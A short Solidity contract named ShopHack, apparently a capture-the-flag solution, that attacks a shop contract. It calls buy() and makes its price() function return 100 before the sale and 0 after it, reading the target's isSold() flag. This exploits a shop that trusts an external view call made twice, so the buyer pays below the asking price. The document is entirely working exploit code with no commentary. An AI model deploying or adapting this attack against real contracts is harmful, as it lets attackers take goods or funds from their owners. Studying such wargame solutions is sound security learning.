// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopHack {
    function attack(address _shop) public {
        IShop(_shop).buy();
    }

    function price() external view returns (uint256) {
        if (IShop(msg.sender).isSold()) return 0;
        else return 100;
    }
}
